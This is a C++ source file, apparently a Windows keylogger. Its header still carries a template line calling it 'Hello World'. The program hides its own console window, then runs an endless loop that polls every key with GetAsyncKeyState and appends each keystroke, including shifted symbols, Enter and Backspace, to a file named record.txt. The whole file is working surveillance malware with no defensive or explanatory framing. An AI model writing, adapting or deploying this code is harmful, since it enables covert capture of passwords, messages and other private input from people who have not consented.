//============================================================================
// Name        : klog.cpp
// Author      : Gopal Agarwal
// Version     :
// Copyright   : Your copyright notice
// Description : Hello World in C++, Ansi-style
//============================================================================

#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;
void logs();
void hide();

int main() {
	hide();
	logs();
	return 0;
}

void logs(){
	char key;
		for(;;){
			for(key=1; key<=222; key++){
				if(GetAsyncKeyState(key) == -32767){
					ofstream write("record.txt", ios::app);

					if((key>64)&&(key<91) && !(GetAsyncKeyState(0x10)) ){
						key+=32;
						write << key;
						write.close();
						break;
					}

					else if((key>64)&&(key<91)){
						write << key;
						write.close();
						break;
					}

					else{
						switch(key){
							case 48:{
								if(GetAsyncKeyState(0x10))
									write << ")";
								else
									write << "0";
							}
							break;

							case 49:{
								if(GetAsyncKeyState(0x10))
									write << "!";
								else
									write << "1";
							}
							break;
							case 50:{
								if(GetAsyncKeyState(0x10))
									write << "@";
								else
									write << "2";
							}
							break;
							case 51:{
								if(GetAsyncKeyState(0x10))
									write << "#";
								else
									write << "3";
							}
							break;
							case 52:{
								if(GetAsyncKeyState(0x10))
									write << "$";
								else
									write << "4";
							}
							break;
							case 53:{
								if(GetAsyncKeyState(0x10))
									write << "%";
								else
									write << "5";
							}
							break;
							case 54:{
								if(GetAsyncKeyState(0x10))
									write << "^";
								else
									write << "6";
							}
							break;
							case 55:{
								if(GetAsyncKeyState(0x10))
									write << "&";
								else
									write << "7";
							}
							break;
							case 56:{
								if(GetAsyncKeyState(0x10))
									write << "*";
								else
									write << "8";
							}
							break;
							case 57:{
								if(GetAsyncKeyState(0x10))
									write << "(";
								else
									write << "9";
							}
							break;

							case VK_BACK: write << " <BackSpace> "; break;
							case VK_RETURN: write << " <Enter>\n"; break;
							case VK_ESCAPE: write << " <Esc> "; break;
							case VK_SPACE: write << " "; break;
							case VK_DELETE: write << " <DEL> "; break;
							case VK_TAB: write << " <TAB> "; break;

							case 17: write << " <ctrl> "; break;
							case 18: write << " <alt> "; break;

							case 37: write << " < "; break;
							case 38: write << " ^ "; break;
							case 39: write << " > "; break;
							case 40: write << " v "; break;

							case 96: write << "0"; break;
							case 97: write << "1"; break;
							case 98: write << "2"; break;
							case 99: write << "3"; break;
							case 100: write << "4"; break;
							case 101: write << "5"; break;
							case 102: write << "6"; break;
							case 103: write << "7"; break;
							case 104: write << "8"; break;
							case 105: write << "9"; break;
							case 106: write << "*"; break;
							case 107: write << "+"; break;
							case 109: write << "-"; break;
							case 110: write << "."; break;
							case 111: write << "/"; break;

						}
					}
				}
			}
		}
}

void hide(){
	HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth,0);
}
